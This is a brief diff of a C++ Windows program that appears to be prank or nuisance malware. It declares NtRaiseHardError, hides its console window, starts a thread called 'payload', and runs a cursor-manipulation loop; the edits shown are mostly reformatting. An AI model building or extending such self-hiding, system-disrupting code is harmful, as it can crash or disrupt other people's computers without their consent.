@@ -29,14 +29,11 @@ EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus,
 
 
 void WarpCursor() {
-	POINT cursor;
+POINT cursor;
 	while (true) {
-		GetCursorPos(&cursor);
-		Sleep(5'000);
-		SetCursorPos(
-			cursor.x,
-			cursor.y
-		);
+	GetCursorPos(&cursor);
+	Sleep(5'000);
+	SetCursorPos(cursor.x ,cursor.y);
 	}
 	}
 
@@ -54,11 +51,7 @@ int main() {
 	BOOLEAN bl;
 	POINT cursor;
 	unsigned long response;
-	
-	GetCursorPos(&cursor);
-	int x = cursor.x;
-	int y = cursor.y;
-	std::cout << "ghskj\n";
+
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	
 	std::thread t1 (payload);
